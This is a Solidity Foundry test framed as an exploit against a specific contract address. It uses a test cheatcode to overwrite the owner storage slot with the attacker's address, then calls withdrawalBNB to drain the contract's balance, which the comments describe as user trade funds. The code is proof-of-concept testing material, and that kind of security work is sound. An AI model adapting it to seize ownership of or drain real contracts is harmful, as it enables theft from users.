// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Engos {
    function withdrawalBNB(uint256 amount, address to) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5548498f6Ae923f590cD1A1cec8D39E1f9363104;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Simulate funds being in the contract from user trades
        deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        uint256 amountToSteal = address(TARGET).balance;

        // As the new owner, withdraw the entire contract balance
        Engos(TARGET).withdrawalBNB(amountToSteal, attacker);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

